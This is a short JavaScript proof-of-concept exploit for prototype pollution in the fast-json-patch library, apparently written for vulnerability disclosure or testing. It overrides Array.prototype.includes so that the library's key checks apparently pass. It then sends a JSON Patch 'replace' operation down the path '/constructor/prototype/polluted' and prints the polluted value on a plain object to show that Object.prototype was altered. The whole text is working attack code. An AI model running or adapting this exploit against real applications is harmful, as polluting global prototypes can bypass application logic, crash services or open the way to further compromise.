Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
let fp = require('fast-json-patch');
const patch = [{
        op: 'replace',
        path: '/constructor/prototype/polluted',
        value: 'yes'
    }];
console.log({}.polluted);
fp.applyPatch({}, patch);
console.log({}.polluted);